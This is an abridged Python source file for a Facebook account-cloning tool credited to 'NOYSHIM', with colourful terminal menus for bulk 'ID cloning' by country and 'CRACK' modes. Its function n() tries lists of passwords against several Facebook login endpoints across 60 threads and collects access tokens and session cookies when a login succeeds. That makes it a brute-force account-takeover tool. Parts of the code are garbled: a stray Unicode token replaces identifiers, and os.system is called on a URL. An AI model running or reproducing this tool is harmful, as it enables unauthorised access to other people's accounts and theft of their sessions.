...
from concurrent.futures import ThreadPoolExecutor as t𝚟𝚊𝚞
...
HBF = '{ HBF }'
my_color = [
 𝚟𝚊𝚞, WHITE, BLACK, BS, GREEN, YELLOW, ORANGE]
...
█╬██ █▄█ ╬█╬ ▄█ █╬█ █ █╬█
    ...
    \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
    ║  \x1b[97m\033[37;41m  NOYSHIM X FACEBOOK XD V2   \033[0;m     \33[1;92m ║
    \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
     {H} ╔════════════════════════{M}════════════════╗
      {H}║{M}[{H}•{M}] AUTHOR    :{H} NOYSHIM CYBER             {N}{M}║
      {H}║{M}[{H}•{M}] FACEBOOK  : {H}MD NOYSHIM          {N}{M}║
      {H}║{M}[{H}•{M}] GITHUB    : {H}NOYSHIM-MN{N}       {H}  ║
      {M}║{M}[{H}•{M}] STATUS    : {H}FREE -X{P}     {N}  {H}      ║
      {M}║{M}[{H}•{M}] VERSION   : {H}3.1.1                  {H} ║
      {M}╚═════════════{H}═══════════════════════════╝ {P}""")
...
def main():
    ...
    print(f'{M}║══[•] VERSION   : {H}NOYSHIM')
    print(f'{M}╚══[•] CODER NAME: {H}NOYSHIM X')
    print(f' ')
    print(f"{M}╔══[{M}1{𝚟𝚊𝚞}] \033[1;32mSTART NOYSHIM  CLONING {𝚟𝚊𝚞}(NOYSHIM 𝚟𝚊𝚞)")
    print(f"║══[{M}2{𝚟𝚊𝚞}] \033[1;34mFOLLOWED MY GITHUB [<\>] {𝚟𝚊𝚞}(FIRST)")
    print(f"║══[{M}3{𝚟𝚊𝚞}] \033[1;35mBACK PROGRAMME [<\>] ")
    print(f"{𝚟𝚊𝚞}╚══[{M}U{𝚟𝚊𝚞}] \033[1;31mUPDATE PROGRAMME ")
...
def _xxx_():
    ...
    print(f'{M}╚══[•] CODER NAME: {H}NOYSHIM X')
    print(f' ')
    print(f"{M}╔══[{M}1{𝚟𝚊𝚞}] \033[1;32mSTART NOYSHIM  RANDOM {𝚟𝚊𝚞}(NOYSHIM 𝚟𝚊𝚞)")
    print(f"{M}╔══[{M}2{𝚟𝚊𝚞}] \033[1;31mSTART NOYSHIM  X GMAIL {𝚟𝚊𝚞}(NOYSHIM 𝚟𝚊𝚞)")
    print(f"║══[{M}3{𝚟𝚊𝚞}] \033[1;34mFOLLOW ME GITHUB [<\>] {𝚟𝚊𝚞}(FIRST)")
    print(f"║══[{M}4{𝚟𝚊𝚞}] \033[1;35mBACK PROGRAMME [<\>] ")
    print(f"{𝚟𝚊𝚞}╚══[{M}U{𝚟𝚊𝚞}] \033[1;31mUPDATE PROGRAMME ")
    sh = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
    if sh =='1':
       os.system('https://www.facebook.com/Noyshim.504/')
...
def _xnxx_():
    ...
    print(f'{M}╚══[•] CODER NAME: {H}NOYSHIM X')
    print(f" ")
    print(f"{𝚟𝚊𝚞}╔══[{M}1{M}] {𝚟𝚊𝚞}RANDOM USER NME {𝚟𝚊𝚞} (MIX) ")
    print(f"║══[{M}2{𝚟𝚊𝚞}] {GREEN}RANDOM GMAIL CLONING{𝚟𝚊𝚞}[>/]")
    print(f"║══[{M}3{𝚟𝚊𝚞}] {BLACK}FOLLOW ME ON GITHUB{𝚟𝚊𝚞}[>/]")
    print(f"║══[{M}F{𝚟𝚊𝚞}] {BLACK}FOLLOW ME ON FB{𝚟𝚊𝚞} ")
    print(f"╚══[{M}U{𝚟𝚊𝚞}] {BLACK}UPDATE PROGRAMME ")
    sh = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
    if sh =='1':
       os.system('https://www.facebook.com/Noyshim.504/')
       user()
...
def _pornhub_():
    ...
    print(f'{M}╚══[•] CODER NAME: {H}NOYSHIM X')
    print(" ")
    print(f"{M}╔══[{H}1{M}] {GREEN}RANDOM BD ID CLONING{𝚟𝚊𝚞} (CHOICE) ")
    print(f"║══[{H}2{M}] {M}RANDOM INDIA CLONING{𝚟𝚊𝚞} (CHOICE) ")
    print(f"║══[{H}3{M}] {H}RANDOM PAK  CLONING{𝚟𝚊𝚞} (CHOICE) ")
    print(f"║══[{H}4{M}] {B}RANDOM INDONESIA CLONING{𝚟𝚊𝚞}(CHOICE)")
    print(f"║══[{H}F{M}] {BLACK}FOLLOW ME ON GITHUB{𝚟𝚊𝚞}[>/]")
    print(f"║══[{H}Y{M}] {𝚟𝚊𝚞}FOLLOW ME ON FB{𝚟𝚊𝚞} ")
...
def _pompom_():
    ...
    print(f'{M}╚══[•] CODER NAME: {H}NOYSHIM X')
    print(" ")
    print(f"{M}╔══[{H}1{M}] {GREEN}CRACK SIMPLE API {𝚟𝚊𝚞} (CHOICE) ")
    print(f"║══[{H}2{M}] {M}CRACK  B API X-XX{𝚟𝚊𝚞} (M1) ")
    print(f"║══[{H}3{M}] {H}CRACK GRAPH API{𝚟𝚊𝚞} (M2) ")
    print(f"║══[{H}4{M}] {B}CRACK API X-XX𝚟𝚊𝚞(M3)")
    print(f"║══[{H}F{M}] {BLACK}FOLLOW ME ON GITHUB{𝚟𝚊𝚞}[>/]")
    print(f"║══[{H}Y{M}] {𝚟𝚊𝚞}FOLLOW ME ON FB{𝚟𝚊𝚞} ")
    print(f"╚══[{H}U{M}] {M}M2 UPDATED DONE ")
...
def _FUCKER_():
    ...
    print(" ")
    print(f"{M}╔══[{H}1{M}] {COLOUR_X}CHOICE 6 DIGIT ID CLONING{𝚟𝚊𝚞} (NOYSHIM 𝚟𝚊𝚞) ")
    print(f"║══[{H}2{M}] {COLOUR_X}CHOICE 7 DIGIT ID CLONING{𝚟𝚊𝚞} (NOYSHIM 𝚟𝚊𝚞) ")
    print(f"║══[{H}3{M}] {COLOUR_X}CHOICE 8 DIGIT ID CLONING{𝚟𝚊𝚞} (NOYSHIM 𝚟𝚊𝚞) ")
    print(f"║══[{H}4{M}] {COLOUR_X}CHOICE 9 DIGIT ID CLONING{𝚟𝚊𝚞} (NOYSHIM 𝚟𝚊𝚞) ")
    print(f"║══[{H}5{M}] {COLOUR_X}CHOICE 10 DIGIT ID CLONING{𝚟𝚊𝚞} (NOYSHIM 𝚟𝚊𝚞) ")
    print(f"║══[{H}6{M}] {COLOUR_X}CHOICE 11 DIGIT ID CLONING{𝚟𝚊𝚞} (NOYSHIM 𝚟𝚊𝚞) ")
    print(f"║══[{H}7{M}] {COLOUR_X}CHOICE 12 DIGIT ID CLONING{𝚟𝚊𝚞} (NOYSHIM 𝚟𝚊𝚞) ")
    print(f"║══[{H}8{M}] {COLOUR_X}CHOICE 13 DIGIT ID CLONING{𝚟𝚊𝚞} (NOYSHIM 𝚟𝚊𝚞) ")
    print(f"║══[{H}9{M}] {COLOUR_X}CHOICE 14 DIGIT ID CLONING{𝚟𝚊𝚞} (NOYSHIM 𝚟𝚊𝚞) ")
    print(f"║══[{H}F{M}] {COLOUR_X}FOLLOW ME ON GITHUB{𝚟𝚊𝚞}[>/]")
    print(f"║══[{H}Y{M}] {COLOUR_X}FOLLOW ME ON FB{𝚟𝚊𝚞} ")
    print(f"╚══[{H}U{M}] {M}UPDATE PROGRAMME ")
...
def shbd():
    ...
    print(f"")
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
    print(f'{P}[{H}√{P}]EXAMPLE : {M}TIK FREE fire  /I LOVE YOU/NOYSHIM/DOREMON/OGGY')
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
    ...
    print(f"")
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'    {P}[{H}√{P}] EXAMPLE    : {K}5000/10000/15000/20000')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f"")
    ...
    with ThreadPool(max_workers=60) as smiyaaa:    
        ...
        tl = str(len(user))
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        print(f" {WHITE}TODAY DATE & TIME     :{𝚟𝚊𝚞} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        print(f'{M}╔══[•] {GREEN}WElCOME  MY TOOLS     : {𝚟𝚊𝚞}'+name)
        print(f'{M}║══[•] {GREEN}TOTAL IDZ             : {𝚟𝚊𝚞}'+tl)
        print(f'{M}║══[•] {GREEN}NUMBER YOU PUT        : {𝚟𝚊𝚞}'+code)
...
def gmail():
    ...
    with ThreadPool(max_workers=60) as smiyaaa:    
        ...
        print(f" {WHITE}TODAY DATE & TIME     :{𝚟𝚊𝚞} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        print(f'{M}╔══[•] {BLACK}WElCOME  MY TOOLS     : {𝚟𝚊𝚞}'+name)
        print(f'{M}║══[•] {BLACK}TOTAL IDZ             : {𝚟𝚊𝚞}'+tl)
        print(f'{M}║══[•] {BLACK}NUMBER YOU PUT        : {𝚟𝚊𝚞}'+gg)
...
def user():
    ...
    with ThreadPool(max_workers=60) as smiyaaa:    
        ...
        print(f" {WHITE}TODAY DATE & TIME     :{𝚟𝚊𝚞} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        print(f'{M}╔══[•] {NOYSHIM}WElCOME  MY TOOLS     : {𝚟𝚊𝚞}'+name)
        print(f'{M}║══[•] {NOYSHIM}TOTAL IDZ             : {𝚟𝚊𝚞}'+tl)
        print(f'{M}║══[•] {NOYSHIM}NUMBER YOU PUT        : {𝚟𝚊𝚞}'+gg)
...
def n(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            po = requests.post('https://api.facebook.com/method/auth.login',data=data,headers=head,allow_𝚟𝚊𝚞irects=False).json()
    ...
    try:
        for ps in pwx:
            ...
            head={f'User-Agent': kk,
                    ...
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head,allow_𝚟𝚊𝚞irects=False).json()
            if 'access_token' in po:
                cokie = po["session_cookies"]
                cok = {}
                for x in cokie:
    ...
    try:
        for ps in pwx:
            ...
            head={f'User-Agent': kk,
                    ...
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head,allow_𝚟𝚊𝚞irects=False).json()
            if 'access_token' in po:
                cokie = po["session_cookies"]
                cok = {}
                for x in cokie:
    ...
    try:
        for ps in pwx:
            ...
            head={f'User-Agent': kk,
                    ...
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://b-api.facebook.com/auth/login',data=data,headers=head,allow_𝚟𝚊𝚞irects=False).json()
            if 'access_token' in po:
                cokie = po["session_cookies"]
                cok = {}
                for x in cokie:
